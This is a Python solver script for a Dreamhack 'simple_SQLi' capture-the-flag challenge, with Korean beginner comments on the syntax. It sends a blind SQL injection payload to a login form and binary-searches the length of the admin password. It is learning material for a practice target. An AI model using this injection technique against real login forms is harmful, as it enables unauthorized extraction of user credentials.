#!/usr/bin/python3.9
import requests # 웹페이지로 요청을 보내야 하니깐 쓰는 라이브러리
from urllib.parse import urljoin # 그냥 말 그대로 url을 합치는 거다.
class Solver:
    """Solver for simple_SQLi challenge"""
    # initialization
    def __init__(self, port: str) -> None: # 화살표는 return값의 타입을 표시 해주는거다. 주석 같은 역할이다.
        # 여기서 잠깐! 콜론은 또 뭐냐? 파라미터 즉 매개변수의 타입을 표시해주는 주는거다.
        # port는 str로 들어올 것이다. 라고 해석할 수 있습니다.
        self._chall_url = f"http://host3.dreamhack.games:{port}"
        self._login_url = urljoin(self._chall_url, "login")
    # base HTTP methods
    def _login(self, userid: str, userpassword: str) -> bool:
        login_data = {
            "userid": userid,
            "userpassword": userpassword
        }
        resp = requests.post(self._login_url, data=login_data)
        return resp
    # base sqli methods
    def _sqli(self, query: str) -> requests.Response:
        resp = self._login(f"\" or {query}-- ", "hi")
                        # userid 인수 부분    userpassword 인수 부분
        return resp
    def _sqli_lt_binsearch(self, query_tmpl: str, low: int, high: int) -> int:
        while 1:
            mid = (low+high) // 2 # 나머지가 정수형으로 떨어진다.
            # print(mid)
            if low+1 >= high:
                break
            query = query_tmpl.format(val=mid)
            if "hello" in self._sqli(query).text:
                high = mid
            else:
                low = mid
        return mid
    # attack methods
    def _find_password_length(self, user: str, max_pw_len: int = 100) -> int:
        query_tmpl = f"((SELECT LENGTH(userpassword) WHERE userid=\"{user}\")<{{val}})"
        pw_len = self._sqli_lt_binsearch(query_tmpl, 0, max_pw_len)
        return pw_len
    def solve(self):
        pw_len = self._find_password_length("admin")
        print(f"Length of admin password is: {pw_len}")
if __name__ == "__main__":
    port = 16061
    solver = Solver(port)
    solver.solve()